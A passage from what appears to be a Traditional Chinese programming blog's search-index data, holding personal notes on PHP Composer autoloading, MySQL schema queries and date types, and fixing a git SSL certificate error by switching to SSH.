dirname 就能抓到$baseDir，你自己寫的程式自然就會讀到 ","date":"2019-01-19","objectID":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/:5:0","tags":["autoload","composer"],"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","uri":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/"},{"categories":["PHP"],"content":"總結 最後，新增 psr0/psr4 跟修改 classmap，記得做compser dump-autoload 你說我怎麼沒有提到 psr0_問題，我已經不想深入太多，可參考別的頁面說明 最後 psr 是 Fig 訂出來的規範，實際你要怎麼載入 php 有很多種方法 當然最好一個檔案一個 class，大小寫路徑可能也要注意(雖然 php namespace 不分大小寫…) 但是了解這種載入機制，以後寫元件都是比較好的切入 範例可以參考 malagege/PHP_composer_autoload_demo: PHP composer autoload 簡單實例 demo 參考來源: composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国 psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否 php - What Are the Differences Between PSR-0 and PSR-4? - Stack Overflow 深入学习 Composer 自动加载（autoload）机制 - Laravel 学院 PHP PSR-4 Autoloader 機制 | Tony Blog PHP Composer 以及 PSR 规范 - 知乎 ","date":"2019-01-19","objectID":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/:6:0","tags":["autoload","composer"],"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","uri":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/"},{"categories":["寫程式一些事"],"content":"最近公司創建 MySQL 需要寫文件 但是通常我們開工單都是在開發環境建立 MySQL 手動建立 Table 產生 SQL 出來 最後還需要產生文件 所以又多一倍功…做那個 但有時改 DB 地方，文件就會忘記改… 今天我手動寫出 sql 讓我不用太花時間方法 XD 在 MySQL 可以下 SELECT '' as NO, if(POSITION(\"PRI\" IN COLUMN_KEY ),'PK','') as '標記', COLUMN_COMMENT as '名稱', COLUMN_NAME '欄位', COLUMN_TYPE as '型態', ifnull(COLUMN_DEFAULT,'') as '預設值', if(IS_NULLABLE='YES','O','') as 'NULL', if(EXTRA='auto_increment','O','') as 'A_I', TABLE_NAME, COLUMN_KEY FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'ooo' AND TABLE_NAME = 'xxx' 不過在INFORMATION_SCHEMA.COLUMNS沒有設定 index 所以通常正式環境有很多 table 還是不要亂用比較好 可以直接複製出來貼到 WORD INFORMATION_SCHEMA.COLUMNS 相關欄位資訊 參考:mysql 的 TABLE_SCHEMA 的 sql 和 information_schema 表, MySQL 管理一些基礎 SQL 語句, Changes in MySQL 5.7.2 - t6 - 博客園 SCHEMATA表：提供了關於數據庫的信息。 TABLES表：給出了關於數據庫中的表的信息。 COLUMNS表：給出了表中的列信息。 STATISTICS表：給出了關於表索引的信息。 USER_PRIVILEGES表：給出了關於全程權限的信息。該信息源自mysql.user授權表。 SCHEMA_PRIVILEGES表：給出了關於方案（數據庫）權限的信息。該信息來自mysql.db授權表。 TABLE_PRIVILEGES表：給出了關於表權限的信息。該信息源自mysql.tables_priv授權表。 COLUMN_PRIVILEGES表：給出了關於列權限的信息。該信息源自mysql.columns_priv授權表。 CHARACTER_SETS表：提供了關於可用字符集的信息。 COLLATIONS表：提供了關於各字符集的對照信息。 COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用於校對的字符集。 TABLE_CONSTRAINTS表：描述了存在約束的表。 KEY_COLUMN_USAGE表：描述了具有約束的鍵列。 ROUTINES表：提供了關於存儲子程序（存儲程序和函數）的信息。此時，ROUTINES表不包含自定義函數（UDF）。 VIEWS表：給出了關於數據庫中的視圖的信息。 TRIGGERS表：提供了關於觸發程序的信息。 相關資料: MySQL :: MySQL 5.7 Reference Manual :: 8.2.3 Optimizing INFORMATION_SCHEMA Queries mysql 的 TABLE_SCHEMA 的 sql 和 information_schema 表, MySQL 管理一些基礎 SQL 語句, Changes in MySQL 5.7.2 - t6 - 博客園 sql - How do I find out which tables have no indexes in MySQL - Stack Overflow ","date":"2019-01-19","objectID":"/blog/posts/%E8%AE%80%E5%8F%96%E5%87%BA%E6%96%87%E4%BB%B6%E8%A8%AD%E8%A8%88%E6%9B%B8%E8%A1%A8%E6%A0%BC%E6%A0%BC%E5%BC%8F/:0:0","tags":["mysql","docs"],"title":"從MySQL裡面直接(select)讀取出文件設計書表格格式","uri":"/blog/posts/%E8%AE%80%E5%8F%96%E5%87%BA%E6%96%87%E4%BB%B6%E8%A8%AD%E8%A8%88%E6%9B%B8%E8%A1%A8%E6%A0%BC%E6%A0%BC%E5%BC%8F/"},{"categories":["PHP"],"content":"最近有計畫學 Laravel 不過想趁機會把 PHP Namespace搞清楚 我在想autoload自動載入是甚麼機制的 最近小小的玩了一下，才知道這個自動載入是怎麼用的 其實我覺得也不是完全自動載入阿~~終究還是手動需做載入一段程式 ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:0:0","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["PHP"],"content":"PHP 原有 autoload 方式 include, include_once, require , require_once 都是載入功能。 比較特別注意 include 當載入失敗會跳出警告，但是不會停止程式 require 載入失敗會跳出錯誤，不會繼續執行下面程式 常常忘記哪個會載入錯誤 orz 順便記載這邊 ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:1:0","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["PHP"],"content":"PHP Autoload 前面兩個是比較早期的自動載入方式。簡單來講就是自動載入xxx.php方法 後面 namespace 可搭配composer實作 __autoload spl_autoload autoload 與 namespace PHP 系列 - Autoload 自動載入 « Eric G. Huang 不像樣工程師 備份圖 上面連結介紹太清楚了。 我這邊仔細記錄我實務的問題 ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:2:0","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["PHP"],"content":"常常搞錯的觀念 我是有學過 Java，所以對 Java Namespace 不是很陌生 但當初看 PHP 的 Namespace 有看沒有懂 學得他們很像，但又不是很像 但說 Java Namespace 定義很清楚 PHP 並沒有那麼清楚(畢竟是腳本語言….) ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:3:0","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["PHP"],"content":"還是需要放置載入程式 首先來看看 Laravel 的 Controller.php \u003c?php namespace App\\Http\\Controllers; use Illuminate\\Foundation\\Bus\\DispatchesJobs; use Illuminate\\Routing\\Controller as BaseController; use Illuminate\\Foundation\\Validation\\ValidatesRequests; use Illuminate\\Foundation\\Auth\\Access\\AuthorizesRequests; class Controller extends BaseController { use AuthorizesRequests, DispatchesJobs, ValidatesRequests; } 看到這個我整個高潮了 其實我以為 PHP 已經完完整整可以自動載入 不過我自己實作卻是不能… 最終爬文還是找到答案 下面那篇 PO 文跟我一樣 HI XD php 的 use 明顯比 require 高端大氣上檔次 - 開源中國 備份圖 php 使用命名空间:导入导出之疑问 - 开源中国 為什麼 Laravel 的 Controller.php 可以自動載入 關鍵還是 index.php 的require __DIR__.'/../vendor/autoload.php'; 所以我才說也不是真正的自動載入 不過方法真的已經比以前好很多 ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:3:1","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["PHP"],"content":"發現我自己寫的 PHP 沒辦法 use 使用到 當以為你以為require 'vendor/autoload.php';可以載入所有 php 檔案內容 你可能就大錯特錯了!!! composer.json 有一個 classmap 自動載入 { ... \"autoload\": { \"classmap\": { \"mylib\" } } ... } ~~但不能設定.~~可以設定. 發現我寫錯了，應該要用陣列才對 上面能跑純屬意外 { ... \"autoload\": { \"classmap\": [ \".\" ] } ... } ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:4:0","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["PHP"],"content":"發現新增檔案跟修改 class 名稱沒有自動載入到 當我發現這件事，還以為我哪裡寫錯了 其實有看到這篇php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork vendor/composer/autoload_classmap.php \u003c?php // autoload_classmap.php @generated by Composer $vendorDir = dirname(dirname(__FILE__)); $baseDir = dirname($vendorDir); return array( 'mylib\\\\Test' =\u003e $baseDir . '/mylib/test.php', ); 看到原來自動載入原來不是真的跑每一層資料夾 是透過暫存方式載入 之前一直還在想有什麼辦法看到目前會自動載入哪些 看來還是有辦法知道的 ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:5:0","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["PHP"],"content":"PSR0 , PSR4 看了一下好像都是自動載入 PSR0 命名規則跟 JAVA 很像 但是 PSR4 規則也不一定要跟 JAVA 擺放位置一樣 我也沒看很詳細，有空再仔細吸收…. psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否 ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:6:0","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["PHP"],"content":"Namespace 一些事 Namespace 是不分大小寫的，跟 class、function 一樣沒有分 但是在 use 引用變數(ex:$a) 想說 class 會不會跟 function 一樣不能共用一樣名字 但測試結果是可以的 我還滿驚呆 \u003c?php //Enter your code here, enjoy! class A { public function __toString() { return 'A'; } } function a(){ echo 'aa'; } echo new A(); echo '========'; echo A(); 結果 A========aa 那同時去做 use A 不知道會 但用在 use 呢?! 經過小小實驗(未確任是否正確，自己得出的結論) function 要用通常是要用 use function xxxx 但是做 classmap 跟 psr-4 都載入不到(不知道為什麼) 但有找到Composer/PSR - How to autoload functions? - Stack Overflow 深入 Composer autoload | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区 要選files 不過沒有什麼事情還是不要用 function 吧 XD 這我就沒實作確認 感覺 composer,psr0,psr4 之後還是需要好好了解 先記錄到這邊 參考來源： 有人用过 PHP 的 use function 吗？ | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区 PHP 系列 - Autoload 自動載入 « Eric G. Huang 不像樣工程師 [PHP]require 和 include @ Jonas’s Blog :: 痞客邦 :: PHP Sandbox, test PHP online, PHP tester Composer 進階原理：PHP 命名空間與 PSR-0 | 轉個彎日誌 備份圖 Composer 設計原理與基本用法 | 轉個彎日誌 備份圖 php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国 php – Compoer – 非常簡單的使用 psr-4 來建立自動讀取類別 | jsnWork php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否 php - What Are the Differences Between PSR-0 and PSR-4? - Stack Overflow PSR-0/PSR-4 命名标准 · php 笔记 · 看云 PHP PSR-4 与 PSR-0 规范 - zHHHe 的专栏 - CSDN 博客 php 的 use 明顯比 require 高端大氣上檔次 - 開源中國 php 使用命名空间:导入导出之疑问 - 开源中国 深入 Composer autoload | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区 如何使用 Namespace? | 點燈坊 PHP Tutorial: Getting Started with Composer | Codementor ","date":"2019-01-18","objectID":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/:7:0","tags":["composer","autoload"],"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","uri":"/blog/posts/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/"},{"categories":["mysql"],"content":"最近用 MySQL 做時間比較 想做datetime欄位(0000-00-00 00:00:00) \u003e '' 結果得出來結果是0 之前知道 SQL 沒有 boolean 不過在做時間比較 發現很奇怪 怎麼跟空字串比較結果為0 Google 一下 發現原來 MySQL 會做自動轉型 0 = ''為1 原來空字串會自動轉成0 所以才會得出這個結果 這個不常做，感覺很容易忘記 2019-06-10 最近發現 null 時候，做 where 條件(大於、小於)不會抓到 但是 0000-00-00 可以 所以這是為什麼大家都會這樣用?! 但這樣做 add_date 時候就會有問題 有優點也有缺點 參考來源： mysql: why comparing a ‘string’ to 0 gives true? - Stack Overflow MySQL :: MySQL 8.0 Reference Manual :: 12.3.2 Comparison Functions and Operators type conversion - MySQL automatically cast/convert a string to a number? - Stack Overflow MySQL :: MySQL 5.7 Reference Manual :: 12.2 Type Conversion in Expression Evaluation ","date":"2019-01-17","objectID":"/blog/posts/mysql%E5%AD%97%E4%B8%B2%E8%87%AA%E5%8B%95%E8%BD%89%E6%95%B8%E5%AD%97%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql"],"title":"mysql字串自動轉數字小記","uri":"/blog/posts/mysql%E5%AD%97%E4%B8%B2%E8%87%AA%E5%8B%95%E8%BD%89%E6%95%B8%E5%AD%97%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"今天發生怪事 公司內網 gitlab 網址 ip 換成網域導致 socuretree 跟 git bash 不能用 後來再找解決的方法 ##解決方法 ","date":"2019-01-12","objectID":"/blog/posts/git%E5%87%BA%E7%8F%BEcurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E9%8C%AF%E8%AA%A4/:0:0","tags":null,"title":"git出現「curl: (60) SSL certificate problem: unable to get local issuer certificate」錯誤","uri":"/blog/posts/git%E5%87%BA%E7%8F%BEcurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E9%8C%AF%E8%AA%A4/"},{"categories":null,"content":"git remote 改成 ssh 網址 走 ssh 方式就能順利解決 git 連線的問題 ","date":"2019-01-12","objectID":"/blog/posts/git%E5%87%BA%E7%8F%BEcurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E9%8C%AF%E8%AA%A4/:0:1","tags":null,"title":"git出現「curl: (60) SSL certificate problem: unable to get local issuer certificate」錯誤","uri":"/blog/posts/git%E5%87%BA%E7%8F%BEcurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E9%8C%AF%E8%AA%A4/"},{"categories":null,"content":"改 curl.cainfo(此方法跟這個沒關係) php.ini 中的 openssl.cafile 設定 php.ini 中的 curl.cainfo 設定 php.ini 中的 /usr/local/etc/openssl/cert.pem 設定 (Homebrew provided) 我發現用瀏覽器網頁都正常，但是在 curl 上面就不正常… 但我這個是 gitlab…，所以跟 php 沒有什麼關係 labs.beyond.com.tw » Yosemite 上 Guzzle 遇到的 openssl certificate 問題 ","date":"2019-01-12","objectID":"/blog/posts/git%E5%87%BA%E7%8F%BEcurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E9%8C%AF%E8%AA%A4/:0:2","tags":null,"title":"git出現「curl: (60) SSL certificate problem: unable to get local issuer certificate」錯誤","uri":"/blog/posts/git%E5%87%BA%E7%8F%BEcurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E9%8C%AF%E8%AA%A4/"},{"categories":null,"content":"憑證看起來沒辦法用在內網上面 瀏覽器網頁都正常，但是在 curl 上面就不正常…，我還不確定能不能這樣用 不過看到下面這篇 SSL 证书是不是不能绑定 192.168.1.1 这类本地地址？ - 梅林 - KoolShare - 源于玩家 服务玩家 其他參考來源： 使用 plesk ssh chrooted 遇到 git clone https SSL 問題 | SSORC.tw 蚊子館: Lighttpd - HTTPS(SSL) 用 curl 和 wget 略過 SSL 憑證 - 筆記 | Mr. 沙先生 curl: (60) SSL certificate problem: unable to get local issuer certificate 错误 - 不忘初心，方得始终 - CSDN 博客 sourcetree 的远程创库验证名字出错，但是记住名字。如何修改？ - 知乎 git 如何避開 SSL 憑證問題 | 老洪的 IT 學習系統 通过 SourceTree 连接 SSL 有问题的自建 gitlab 服务器 - fishmai 的专栏 - CSDN 博客 ","date":"2019-01-12","objectID":"/blog/posts/git%E5%87%BA%E7%8F%BEcurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E9%8C%AF%E8%AA%A4/:0:3","tags":null,"title":"git出現「curl: (60) SSL certificate problem: unable to get local issuer certificate」錯誤","uri":"/blog/posts/git%E5%87%BA%E7%8F%BEcurl-60-SSL-certificate-problem-unable-to-get-local-issuer-certificate%E9%8C%AF%E8%AA%A4/"},{"categories":["MySQL"],"content":"常時間我們都會記錄時間 很常大家都會使用datetime來記錄 有時候大家也很喜歡使用unixtime來做時間記錄 到底 DB 有沒有記錄什麼時間方法 這篇只是小記 由於我現在公司使用 unixtime 型別存在資料庫是int 今天用 phpmyadmin 操作設定 ts 欄位(int10)做 default value 動做 CURRENT_TIMESTAMP 竟然不能 work!!!! 哪尼我要做 default 不能做 後來看到MySQL Timestamp 型態 的 屬性(新增/修改 自動更新 Timestamp 型態 的 欄位) | Tsung’s Blog 他是用 timestamp…，等等 timestamp 不是 int 嗎… 不過我看了一下 phpmyadmin 顯示是時間的日期 這邊我們先來看官方文件怎麼說? ","date":"2019-01-10","objectID":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/:0:0","tags":["mysql"],"title":"Mysql記錄時間的那些事情","uri":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"官方文件 ","date":"2019-01-10","objectID":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/:1:0","tags":["mysql"],"title":"Mysql記錄時間的那些事情","uri":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"String and Numeric Literals in Date and Time Context. MySQL recognizes DATE values in these formats: As a string in either ‘YYYY-MM-DD’ or ‘YY-MM-DD’ format. A “relaxed” syntax is permitted: Any punctuation character may be used as the delimiter between date parts. For example, ‘2012-12-31’, ‘2012/12/31’, ‘2012^12^31’, and ‘2012@12@31’ are equivalent. As a string with no delimiters in either ‘YYYYMMDD’ or ‘YYMMDD’ format, provided that the string makes sense as a date. For example, ‘20070523’ and ‘070523’ are interpreted as ‘2007-05-23’, but ‘071332’ is illegal (it has nonsensical month and day parts) and becomes ‘0000-00-00’. As a number in either YYYYMMDD or YYMMDD format, provided that the number makes sense as a date. For example, 19830905 and 830905 are interpreted as ‘1983-09-05’. 簡單來說 MySQL 來看時間'2018-12-12’,‘20181212’,‘2018@12@12’ MySQL 都看得懂 ‘181212’他也會自動轉成'2018-12-12’ 非字串數字也能轉成時間 好吧大多數來講這樣寫，可能會被公司長輩打頭(逃~~) ","date":"2019-01-10","objectID":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/:1:1","tags":["mysql"],"title":"Mysql記錄時間的那些事情","uri":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"MySQL recognizes DATETIME and TIMESTAMP values in these formats: MySQL recognizes DATETIME and TIMESTAMP values in these formats: As a string in either ‘YYYY-MM-DD HH:MM:SS’ or ‘YY-MM-DD HH:MM:SS’ format. A “relaxed” syntax is permitted here, too: Any punctuation character may be used as the delimiter between date parts or time parts. For example, ‘2012-12-31 11:30:45’, ‘2012^12^31 11+30+45’, ‘2012/12/31 113045’, and ‘2012@12@31 11^30^45’ are equivalent. The only delimiter recognized between a date and time part and a fractional seconds part is the decimal point. The date and time parts can be separated by T rather than a space. For example, ‘2012-12-31 11:30:45’ ‘2012-12-31T11:30:45’ are equivalent. As a string with no delimiters in either ‘YYYYMMDDHHMMSS’ or ‘YYMMDDHHMMSS’ format, provided that the string makes sense as a date. For example, ‘20070523091528’ and ‘070523091528’ are interpreted as ‘2007-05-23 09:15:28’, but ‘071122129015’ is illegal (it has a nonsensical minute part) and becomes ‘0000-00-00 00:00:00’. As a number in either YYYYMMDDHHMMSS or YYMMDDHHMMSS format, provided that the number makes sense as a date. For example, 19830905132800 and 830905132800 are interpreted as ‘1983-09-05 13:28:00’. 簡單來說他跟上面點都差不多，第二點在說date跟time需要用一個符號區分開(矇逼，我沒看文件還真的不知道…) 不知道動手玩看看就知道 select unix_timestamp('2012@12@31'); select unix_timestamp('2012-12-31'); select unix_timestamp('20121231'); select unix_timestamp('20021231'); select unix_timestamp('021231'); select unix_timestamp('2012@12@31 010101'); select unix_timestamp('2012-12-31G010101'); PS: 兩位數轉換官方文件也有寫清楚 Year values in the range 70-99 are converted to 1970-1999. Year values in the range 00-69 are converted to 2000-2069. 官方文件 MySQL :: MySQL 8.0 Reference Manual :: 11.3.1 The DATE, DATETIME, and TIMESTAMP Types MySQL :: MySQL 8.0 Reference Manual :: 9.1.3 Date and Time Literals 更詳細的 datetime 跟 timestamp 差別請看MySQL 案例之 Timestamp 和 Datetime - Rangle - 博客园 備份圖 我過去看過型別 datetime timestamp int varchar int 是現在公司用的 varchar 事前一間公司用的，聽說很舊系統都這樣用，聽說好移轉 XD ","date":"2019-01-10","objectID":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/:1:2","tags":["mysql"],"title":"Mysql記錄時間的那些事情","uri":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"使用 unixtime 要注意的大小事 - 時區問題 如裡面有做備份說明MySQL 案例之 Timestamp 和 Datetime - Rangle - 博客园 不過我看一些紀錄都不建議用 timestamp 做紀錄 詳細如下 timezone - How do I get the current time zone of MySQL? - Stack Overflow Mysql 的問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 MySQL 的时区是否应该设置为 UTC？ - 代码日志 如何在 MySQL 中存储 datetime 与时区信息 - 代码日志 sql-我应该在 MySQL 中使用 datetime 还是 timestamp 数据类型？——CSDN 问答频道 推估應該要以程式端為主控制(?!，目前自己猜測的…) 先記錄到這邊 題外話 想起之前想寫一篇 timezone format 筆記 但都沒有抽出時間寫2014-12-01T12:00:00Z [ Alex 宅幹嘛 ] 👨‍💻moment.js 日期時間管理資源庫入門導讀 - YouTube 有時間來時做一個來玩玩看 另外瀏覽器的時間格式是2118-01-01 剛好發現…html 的 input type 屬性datetime屬性廢棄掉了 | MDN | MDN 他的格式是2018-06-12T19:30 前端最近流行這個格式??? ","date":"2019-01-10","objectID":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/:2:0","tags":["mysql"],"title":"Mysql記錄時間的那些事情","uri":"/blog/posts/Mysql%E8%A8%98%E9%8C%84%E6%99%82%E9%96%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/"},{"categories":["程式心法"],"content":"最近要抓一個資料夾所有檔案路徑 在想有什麼方法可以一次快速搞定? 所以我想一個笨方法 就是新增 git git add * git status 在複製所有路徑到編輯器再做修改 覺得還是有更快的方案 後來有在網路上爬到一個發法 在想要的目錄下面開啟 cmd(git bash.exe) 執行find . 會印出所有當下目錄檔案路徑 find . \u003e filepath.txt 可快速建立出來所有東西 要切出 file 名稱 可以在 sublime Text 做正規化[^/]+.php 收工 XDD 